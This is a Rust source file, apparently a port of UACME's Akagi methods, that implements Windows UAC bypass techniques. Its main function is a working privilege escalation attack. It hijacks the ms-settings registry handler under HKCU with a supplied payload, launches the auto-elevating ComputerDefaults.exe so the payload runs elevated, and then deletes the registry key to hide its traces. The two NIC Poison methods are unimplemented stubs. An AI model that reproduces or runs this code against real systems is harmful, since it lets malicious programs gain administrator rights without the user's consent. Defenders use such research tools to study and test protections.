// Antonio Coco's UAC bypass methods
// Port of Source/Akagi/methods/antonioCoco.c

use crate::context::*;
use crate::methods::*;
use shared::*;
use windows::core::PCWSTR;

/// Method 62: MS Settings 2
/// Bypass UAC using ms-settings protocol (variant 2)
pub fn method_ms_settings2(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 62] MS Settings 2");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    // Similar to method 33 but different trigger
    ms_settings2_registry_hijack(&payload_str)
}

/// Method 63: NIC Poison
/// Bypass UAC using NIC configuration poisoning
pub fn method_nic_poison(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 63] NIC Poison");
    
    log::warn!("NIC Poison method not fully implemented");
    constants::STATUS_NOT_IMPLEMENTED
}

/// Method 71: NIC Poison 2
/// Bypass UAC using NIC configuration poisoning (variant 2)
pub fn method_nic_poison2(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 71] NIC Poison 2");
    
    log::warn!("NIC Poison 2 method not fully implemented");
    constants::STATUS_NOT_IMPLEMENTED
}

/// MS Settings 2 registry hijack
fn ms_settings2_registry_hijack(payload: &str) -> MethodResult {
    use windows::Win32::System::Registry::*;
    use windows::Win32::Foundation::*;
    
    // HKCU\Software\Classes\ms-settings\shell\open\command
    let reg_path = to_wide_string("Software\\Classes\\ms-settings\\shell\\open\\command");
    
    unsafe {
        let key_result = winapi_ext::RegistryKey::create(
            HKEY_CURRENT_USER,
            &reg_path,
            KEY_WRITE.0,
        );
        
        let key = match key_result {
            Ok(k) => k,
            Err(e) => {
                log::error!("Failed to create registry key: {}", e);
                return constants::STATUS_ACCESS_DENIED;
            }
        };
        
        let payload_wide = to_wide_string(payload);
        let empty_wide = to_wide_string("");
        
        if key.set_string_value(&empty_wide, &payload_wide).is_err() {
            return constants::STATUS_ACCESS_DENIED;
        }
        
        let delegate_wide = to_wide_string("DelegateExecute");
        let _ = key.set_string_value(&delegate_wide, &empty_wide);
        
        // Launch ComputerDefaults.exe
        let sys_dir = query_system_directory(true);
        let sys_dir_str = from_wide_string(&sys_dir);
        let computer_defaults = format!("{}ComputerDefaults.exe", sys_dir_str);
        
        let result = match winapi_ext::create_process_simple(&to_wide_string(&computer_defaults), None, 1) {
            Ok(pi) => {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
                std::thread::sleep(std::time::Duration::from_secs(3));
                constants::STATUS_SUCCESS
            }
            Err(_) => constants::STATUS_ACCESS_DENIED,
        };
        
        // Cleanup
        let ms_settings_path = to_wide_string("Software\\Classes\\ms-settings");
        let _ = RegDeleteTreeW(HKEY_CURRENT_USER, PCWSTR(ms_settings_path.as_ptr()));
        
        result
    }
}

